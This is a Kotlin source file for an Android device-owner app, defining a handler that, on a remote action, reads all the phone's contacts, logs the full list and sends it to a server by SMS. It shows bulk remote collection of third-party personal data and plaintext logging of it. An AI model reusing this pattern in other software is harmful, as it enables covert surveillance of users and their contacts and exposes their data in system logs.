package com.trex.rexandroidsecureclient.deviceowner.actionhandlers

import android.content.Context
import android.util.Log
import com.trex.rexcommon.data.DeviceActions

class GetContactsViaMessageHandler(
    private val context: Context,
) : GetContactsHandler(context) {
    override fun handle() {
        val contactsList = getAllContacts(context.contentResolver)
        val contactsString = contactsList.joinToString(",")
        val contactsPayload = mapOf("contacts" to contactsString)
        Log.i("contacts list", "handle: $contactsString")
        if (contactsList.isNotEmpty()) {
            sendToServerViaSMS(
                context,
                DeviceActions.ACTION_GET_CONTACTS_VIA_MESSAGE,
                contactsPayload,
            )
        } else {
            Log.e("TAG", "handle: Error contact list empty")
        }
    }
}
